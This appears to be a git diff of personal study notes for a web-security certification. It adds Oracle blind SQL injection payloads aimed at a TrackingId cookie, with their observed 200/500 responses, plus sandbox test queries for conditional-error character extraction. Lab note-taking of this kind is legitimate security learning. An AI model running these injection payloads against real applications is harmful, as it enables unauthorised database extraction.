@@ -1,4 +1,3 @@
-# bscp
 ## basic extraction
 ### oracle
 ```
@@ -270,8 +269,76 @@ TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(username||':'||
 97   a
 100  d
 ```
+### conditional errors
+```
+TrackingId=obviouslywrong' <<-- 500 error
+TrackingId=obviouslywrong'' <<-- 200 OK
+
+# confirm if error is caused by sql query
+TrackingId=obviouslywrong'+or+'1'='2 <<-- 200 OK
+TrackingId=obviouslywrong'+or+'1'='2' <<-- 500 error
+
+# since '1'='2' is FALSE but returns 200 OK, and an extra quote returns 500 error, looks like it's SQL query formatting that caused the different responses
+
+# try casting errors - didn't try in the end
+TrackingId=obviouslywrong'+or+'1'='2
+
+# try normal queries
+TrackingId=obviouslywrong'+or+'1'='2'+order+by+1-- <<-- OK
+TrackingId=obviouslywrong'+union+select+version()-- <<-- 500 error
+TrackingId=obviouslywrong'+union+select+banner+from+v$version-- <<-- OK; Oracle
+
+# oracle extraction
+TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select+ascii(substr((select+'a'+from+dual),1,1))+from+dual)=98+THEN+to_char(1/0)+ELSE+'a'+END+FROM+dual)||'
+#200 OK
+
+TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select+ascii(substr((select+'a'+from+dual),1,1))+from+dual)=97+THEN+to_char(1/0)+ELSE+'a'+END+FROM+dual)||'
+#500 error <<-- nice
+
+
+``` 
+
 
 # drafts
+oracle tests
+```
+# http://sqlfiddle.com/#!9/649e74/5
+# schema
+create table scientist (id integer, firstname varchar(100), lastname varchar(100));
+insert into scientist (id, firstname, lastname) values (1, 'albert', 'einstein');
+insert into scientist (id, firstname, lastname) values (2, 'isaac', 'newton');
+insert into scientist (id, firstname, lastname) values (3, 'marie', 'curie');
+
+# query
+select firstname from scientist;
+select firstname from scientist where firstname like 'a%';
+select firstname from scientist where firstname like 'a%' or '1'='1';
+select firstname from scientist where firstname like 'a%' and (select ascii(substr((select 'a' from dual),1,1)) from dual)=97
+select firstname from scientist where firstname like 'a%' and (select substr((select 'a' from dual),1,1) from dual)=chr(97)
+
+# cast <<-- inner "as integer" won't allow "else 'string'"
+SELECT CAST ((9) AS INTEGER) int FROM DUAL
+SELECT CAST ((9) AS CHAR) int FROM DUAL
+SELECT CAST ((SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual) AS INTEGER) int FROM DUAL
+SELECT CAST ((SELECT CASE WHEN 1=1 THEN 1 ELSE 'A' END FROM dual) AS INTEGER) int FROM DUAL
+# ORA-00932: inconsistent datatypes: expected NUMBER got CHAR
+
+# to_char
+SELECT CASE WHEN 1=1 THEN to_char(1/0) ELSE '' END FROM dual
+#ORA-01476: divisor is equal to zero
+
+SELECT CASE WHEN 1=2 THEN to_char(1/0) ELSE '' END FROM dual
+#(null) <<-- OK
+
+SELECT CASE WHEN (select substr((select 'a' from dual),1,1) from dual)=chr(97) THEN to_char(1/0) ELSE '' END FROM dual
+##ORA-01476: divisor is equal to zero <<-- nice
+
+SELECT CASE WHEN (select substr((select 'a' from dual),1,1) from dual)=chr(98) THEN to_char(1/0) ELSE '' END FROM dual
+#(null) <<-- OK
+
+SELECT CASE WHEN (select ascii(substr((select 'a' from dual),1,1)) from dual)=98 THEN to_char(1/0) ELSE '' END FROM dual
+#(null) <<-- OK
+```
 postgresql tests
 ```
 # postgresql testing (https://extendsclass.com/postgresql-online.html)
